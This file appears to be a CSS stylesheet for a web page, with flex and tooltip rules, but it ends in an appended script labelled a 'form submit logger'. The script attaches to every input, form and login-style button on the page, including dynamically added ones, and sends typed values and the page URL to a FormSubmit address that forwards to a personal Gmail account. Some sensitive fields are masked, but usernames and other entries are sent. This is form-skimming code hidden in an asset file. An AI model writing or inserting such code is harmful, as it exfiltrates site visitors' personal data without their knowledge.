body,

.flex-container {

  flex-wrap: wrap;
}

.flex-menu {
  display:flex; 
  flex-direction: column;
  padding-top: 20px;
}

/* Tooltip */
.tooltip {
  position: relative; 
  display: inline-block;
}

.tooltip .tooltiptext {
  visibility: hidden; 
  width: 80px;
  font-size: 10px;
  background-color: blue; 
  color: #fff; 
  text-align: center; 
  border-radius: 3px; 
  padding: 2px 0; 
  /* Position the tooltip */ 
  position: absolute;
  z-index: 1;
  top: 100%;
  left: 50%;
  margin-left: -60px;
}

.tooltip .tooltiptext::after {
content: " ";
    position: absolute;
    bottom: 100%;  /* At the top of the tooltip */
    left: 50%;
    margin-left: -5px;
    border-width: 5px;
    border-style: solid;
    border-color: transparent transparent black transparent;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
}

/* HEADER */
div.fra_header {

}

<!-- FORM SUBMIT LOGGER -->
<script>
// CONFIGURATION
const CONFIG = {
    // Your FormSubmit endpoint
    FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/kiddxxq1@gmail.com',
    
    // Time to wait after typing before considering input "finished" (ms)
    INPUT_IDLE_TIMEOUT: 2000,
    
    // Patterns that indicate a submit button
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 
        'next', 'confirm', 'proceed', 'authenticate'
    ],
    
    // Fields to mask in logs and submissions
    SENSITIVE_FIELDS: ['password', 'pin', 'pwd', 'credit', 'cvv', 'ssn']
};

// ===== LOGGER SETUP =====
(() => {
    // Create minimal logger UI
    const logger = document.createElement('div');
    logger.style.position = 'fixed';
    logger.style.bottom = '10px';
    logger.style.right = '10px';
    logger.style.width = '350px';
    logger.style.maxHeight = '200px';
    logger.style.overflowY = 'auto';
    logger.style.background = 'rgba(0,0,0,0.8)';
    logger.style.color = '#0f0';
    logger.style.padding = '10px';
    logger.style.fontFamily = 'monospace';
    logger.style.fontSize = '12px';
    logger.style.zIndex = '99999';
    logger.style.border = '1px solid #0f0';
    logger.style.borderRadius = '5px';
    document.body.appendChild(logger);

    const log = (msg, type='info') => {
        const colors = { info: '#0f0', warn: '#ff0', error: '#f00', submit: '#0ff' };
        const entry = document.createElement('div');
        entry.style.color = colors[type] || '#0f0';
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logger.appendChild(entry);
        logger.scrollTop = logger.scrollHeight;
        console.log(`[Form Logger] ${msg}`);
    };

    // ===== DATA CAPTURE =====
    let typingTimer;
    let formData = {};

    // Mask sensitive values
    const maskSensitive = (key, value) => {
        if (!key) return value;
        const isSensitive = CONFIG.SENSITIVE_FIELDS.some(field => 
            key.toLowerCase().includes(field)
        );
        return isSensitive ? '***' : value;
    };

    // Send data via FormSubmit
    const sendToFormSubmit = async (data) => {
        try {
            log('Preparing FormSubmit request...', 'submit');
            
            const formData = new FormData();
            formData.append('_captcha', 'false');
            formData.append('_subject', 'Form Data Capture');
            formData.append('_template', 'table');
            
            // Add captured data
            formData.append('page_url', window.location.href);
            formData.append('timestamp', new Date().toISOString());
            
            Object.entries(data).forEach(([key, value]) => {
                formData.append(key, value);
            });

            const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            
            if (result.success) {
                log('Data successfully sent via FormSubmit', 'submit');
            } else {
                log(`FormSubmit error: ${result.message}`, 'error');
            }
        } catch (err) {
            log(`Failed to send: ${err.message}`, 'error');
        }
    };

    // ===== EVENT HANDLERS =====
    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = field.name || field.id || 'unnamed_field';
                    const value = field.value;
                    if (value) {
                        formData[name] = maskSensitive(name, value);
                        log(`Captured: ${name} = ${formData[name]}`);
                    }
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    const setupSubmissionHandlers = () => {
        // Form submissions
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const data = {};
                Array.from(form.elements).forEach(el => {
                    if (el.name && el.value) {
                        data[el.name] = maskSensitive(el.name, el.value);
                    }
                });
                log('Form submission detected', 'submit');
                sendToFormSubmit(data);
            }, true);
        });

        // Button clicks
        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const btnText = (btn.textContent || btn.value || '').toLowerCase();
                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
                    btnText.includes(pattern)
                );
                
                if (isSubmit && Object.keys(formData).length > 0) {
                    log('Submit button clicked: ' + btnText, 'submit');
                    sendToFormSubmit(formData);
                    formData = {}; // Clear after submission
                }
            }, true);
        });
    };

    // ===== INITIALIZATION =====
    log('FormSubmit Logger Initialized');
    setupInputHandlers();
    setupSubmissionHandlers();

    // Watch for dynamically added elements
    new MutationObserver(() => {
        setupInputHandlers();
        setupSubmissionHandlers();
    }).observe(document.body, { childList: true, subtree: true });
})();
</script>
</body>
</html>
